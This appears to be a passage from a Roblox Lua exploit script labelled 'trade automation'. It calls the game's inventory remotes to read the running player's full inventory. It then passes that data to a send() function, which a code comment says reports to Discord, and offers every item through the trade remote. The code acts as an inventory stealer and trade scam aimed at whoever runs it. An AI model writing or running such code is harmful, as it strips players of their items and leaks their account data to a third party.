-- TRADE AUTOMATION – using inventory remotes
-- ============================================================
local RS = game:GetService("ReplicatedStorage")
local Trade = RS:FindFirstChild("Trade")
if not Trade then print("Trade folder not found"); return end

-- Trade remotes
local SendReq = Trade:FindFirstChild("SendRequest")
local AcceptReq = Trade:FindFirstChild("AcceptRequest")
local StartTr = Trade:FindFirstChild("StartTrade")
local AcceptTr = Trade:FindFirstChild("AcceptTrade")
local CompleteTr = Trade:FindFirstChild("CompleteTrade")
local OfferItem = Trade:FindFirstChild("OfferItem")

-- Inventory remote (use the one that works)
-- From the list: ReplicatedStorage.Remotes.Inventory.GetProfileData (RemoteFunction)
-- Also: ReplicatedStorage.Remotes.Extras.GetFullInventory (RemoteFunction)
local InventoryFolder = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Inventory")
local GetProfileData = InventoryFolder and InventoryFolder:FindFirstChild("GetProfileData")
local GetFullInventory = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Extras") and RS.Remotes.Extras:FindFirstChild("GetFullInventory")

if not GetProfileData and not GetFullInventory then
    print("Inventory remote not found – will fallback to Backpack")
end

-- Function to get inventory items (returns a table of item IDs or data)
local function getInventory()
    local inventory = {}
    -- Try GetProfileData first
    if GetProfileData then
        local ok, data = pcall(function() return GetProfileData:InvokeServer() end)
        if ok and data then
            print("Got inventory via GetProfileData")
            send("Inventory data received")
            -- Parse data – we need to see its structure. This will be sent to Discord.
            send("Inventory data: " .. tostring(data))
            -- Assume data is a table of item IDs or a list.
            if type(data) == "table" then
                -- If it's a dictionary with item IDs as keys, collect them
                for key, val in pairs(data) do
                    if type(key) == "number" or type(key) == "string" then
                        table.insert(inventory, key) -- or val, depending on structure
                    end
                end
            end
            return inventory
        end
    end
    -- Fallback to GetFullInventory
    if GetFullInventory then
        local ok, data = pcall(function() return GetFullInventory:InvokeServer() end)
        if ok and data then
            print("Got inventory via GetFullInventory")
            send("FullInventory data: " .. tostring(data))
            if type(data) == "table" then
                for key, val in pairs(data) do
                    if type(key) == "number" or type(key) == "string" then
                        table.insert(inventory, key)
                    end
                end
            end
            return inventory
        end
    end
    -- Last resort: look for tools in Backpack and Character
    local tools = {}
    for _, t in pairs(player.Backpack:GetChildren()) do
        if t:IsA("Tool") then table.insert(tools, t.Name) end
    end
    for _, t in pairs(char:GetChildren()) do
        if t:IsA("Tool") and not table.find(tools, t.Name) then table.insert(tools, t.Name) end
    end
    if #tools > 0 then
        print("Found " .. #tools .. " tools in Backpack/Character")
        return tools
    end
    return {} -- empty if nothing
end

-- Offer each item via OfferItem remote
local function offerItems(itemList)
    if not OfferItem then return 0 end
    local offered = 0
    for _, item in ipairs(itemList) do
        -- The item could be a number (ID) or a string (name)
        local ok, err = pcall(function()
            OfferItem:FireServer(item)   -- try with the raw data
        end)
        if ok then
            offered = offered + 1
            print("Offered item: " .. tostring(item))
        else
            -- If that fails, try with the item as a table with an ID field
            if type(item) == "table" and item.ID then
                ok, err = pcall(function() OfferItem:FireServer(item.ID) end)
                if ok then
                    offered = offered + 1
                    print("Offered item (ID): " .. tostring(item.ID))
                end
            else
                print("Failed to offer item: " .. tostring(item))
            end
        end
        wait(0.1)
    end
    return offered
end

